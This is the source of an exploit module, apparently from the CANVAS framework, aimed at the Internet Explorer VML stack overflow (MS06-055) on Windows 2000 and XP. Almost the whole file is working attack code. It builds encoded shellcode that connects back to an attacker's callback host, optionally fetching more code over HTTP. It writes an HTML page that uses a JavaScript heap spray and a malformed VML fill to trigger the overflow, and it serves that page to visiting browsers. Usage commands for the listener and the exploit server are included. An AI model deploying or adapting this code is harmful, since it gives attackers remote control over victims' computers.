#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside

NAME='Internet Explorer Vector Markup Language Overflow'
DESCRIPTION='Internet Explorer Vector Markup Language Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='09/26/06'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS06-055.mspx'
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2006-4868'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4868'
DOCUMENTATION['CVSS'] = 9.3

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']
PROPERTY['MSADV']='MS06-055'
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
Tested on:
Windows 2000 Professional SP4 English OOTB
Windows XP Professional SP2 English OOTB (DEP OptIn)

Usage:
./commandlineInterface.py -p 5555 -v 9
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:ms06_055 -l 10.10.11.1 -d 5555 -p 8080 -O httpmosdef:1
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.version=0
        self.badstring='\0\xff'
        self.name=NAME 
        self.filename='test.html'
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        httpWrapper=''
        try:
            if self.HTTPMOSDEF:
                print '[!] using HTTP MOSDEF tunneling ..'
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x1000})
                if self.useSSLMOSDEF:
                    ssl='s'
                else:
                    ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http%s://%s:%d'%(ssl,host,port)})
                httpWrapper=sc.get()
                print '[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper))
        except:
            httpWrapper=''
        rawshellcode=self.createInjectToSelf(host,port,injectme=httpWrapper,movetostack=True)
        from encoder import chunkedaddencoder
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode=encoder.encode(rawshellcode)
        return self.shellcode

    def makefile(self):
        block=''
        block+='&#x8080'*0x120 #will trigger an access violation since 0x80808080 is in kernel space
        block+='&#x0a0a'*0x2460
        filedata="""<html xmlns:v="urn:schemas-microsoft-com:vml">
<head>
<style>
v\:* { behavior: url(#default#VML); }
</style>
</head>
<body>
<v:rect style="HEIGHT:80pt; WIDTH:120pt" coordsize="21600,21600" fillcolor="red">
<script>
ar=new Array();
function spray(buffer) {
    var hope=unescape("%u9090%u9090");
    var unbuffer=unescape(buffer);
    var v=20+unbuffer.length;
    while(hope.length<v) hope+=hope;
    var fk=hope.substring(0,v);
    var bk=hope.substring(0,hope.length-v);
    delete v;
    delete hope;
    while(bk.length+v<0x42000) bk=bk+bk+fk;
    for(i=0;i<240;i++) ar[i]=bk+unbuffer;
}
spray("SHELLCODE");
</script>
<v:fill method="BLOCK" type="gradient" angle="-90">
</v:rect>
</v:fill>
</body>
</html>""".replace('SHELLCODE',urluencode('AAAA'+self.shellcode)).replace('BLOCK',block) #'AAAA' is necessary for instructions alignement
        return filedata

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
